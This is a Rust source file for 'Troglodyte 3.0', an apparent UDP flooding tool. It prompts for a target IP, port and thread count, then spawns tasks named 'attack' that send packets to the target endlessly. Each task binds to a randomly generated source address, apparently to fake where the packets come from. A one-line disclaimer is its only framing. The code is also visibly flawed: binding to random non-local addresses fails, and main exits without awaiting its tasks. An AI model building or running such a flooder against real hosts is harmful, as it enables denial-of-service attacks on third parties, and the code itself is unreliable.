use rand::{thread_rng, Rng};
use std::net::SocketAddrV4;
use std::sync::Arc;
use std::sync::Mutex;
use std::io;
use tokio::time::Duration;
use tokio::time::sleep;
use tokio::net::UdpSocket;

fn input(prompt: &str) -> String {
    println!("{}", prompt);
    let mut input: String = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");
    input.trim().to_string()
}


#[tokio::main]
async fn main() {
    println!("Troglodyte 3.0 By VTJ0cGJ\nThe creator does not endorse any unintended use of this software");

    let threads_input: String = input("Enter number of threads: ").to_string();
    let threads_result: Result<u32, _> = threads_input.parse();
    let threads: u32 = threads_result.unwrap_or_else(|e: std::num::ParseIntError| {
        eprintln!("Error parsing input: {}", e);
        std::process::exit(1);
    });

    let target_ip: String = input("Enter destination IPv4: ").to_string();
    
    let target_port_input: String = input("Enter destination port: ").to_string();
    let target_port_result: Result<u16, _> = target_port_input.parse();
    let target_port: u16 = target_port_result.unwrap_or_else(|e: std::num::ParseIntError| {
        eprintln!("Error parsing input: {}", e);
        std::process::exit(1);
    });

    let threads_list: Arc<Mutex<Vec<tokio::task::JoinHandle<()>>>> = Arc::new(Mutex::new(Vec::new()));

    for thread_id in 1..=threads {
        let source_ip: String = format!(
            "{}.{}.{}.{}",
            thread_rng().gen_range(0..=255),
            thread_rng().gen_range(0..=255),
            thread_rng().gen_range(0..=255),
            thread_id
        );

        let handle: tokio::task::JoinHandle<()> = tokio::spawn(attack(
            source_ip.clone(),
            target_ip.clone(),
            target_port,
            thread_id,
        ));

        threads_list.lock().expect("REASON").push(handle);
    }
}

async fn attack(source_ip: String, target_ip: String, target_port: u16, thread_id: u32) {
    let mut i: i32 = 1;
    loop {
        let source_port: i32 = rand::thread_rng().gen_range(1..=65535);

        // Create the destination address
        let addr: String = format!("{}:{}", target_ip, target_port);

        // Bind the socket to the source IP and port
        let local_addr: String = format!("{}:{}", source_ip, source_port);
        let socket: UdpSocket = UdpSocket::bind(&local_addr).await.expect("Failed to bind address");

        // Send data to the target address
        let data_to_send: &[u8] = b"Hello, server!";
        socket.send_to(data_to_send, &addr.parse::<SocketAddrV4>().expect("Invalid target address"))
            .await
            .expect("Failed to send data");    

        println!("Packet sent: {} on thread: {}", i, thread_id);

        // Sleep for 100 milliseconds before sending the next packet
        sleep(Duration::from_millis(100)).await;
        i += 1;
    }
}